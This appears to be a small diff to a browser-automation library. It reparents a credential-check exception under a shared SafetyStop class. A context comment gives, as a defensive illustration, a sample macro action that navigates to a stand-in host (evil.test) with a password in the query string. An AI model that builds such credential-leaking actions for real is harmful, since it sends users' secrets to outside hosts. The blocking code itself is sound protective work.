@@ -32,6 +32,8 @@ from collections.abc import Callable
 from typing import Any
 from urllib.parse import urlsplit
 
+from octowright.safety_stop import SafetyStop
+
 # Action fields that either leave the machine or execute code. A credential
 # expanded into one of these is exfiltration, not automation:
 # ``{"action": "navigate", "url": "https://evil.test/?p={{password}}"}`` sends
@@ -81,7 +83,7 @@ def credential_sinks_blocked() -> bool:
     return raw not in _CREDENTIAL_SINKS_OFF
 
 
-class CredentialSafetyStop(Exception):
+class CredentialSafetyStop(SafetyStop):
     """A credential check stopped a macro: a verdict on the macro, never a flaky page.
 
     A macro's ``try`` and ``try_each`` (``octowright.conditional``) re-raise it
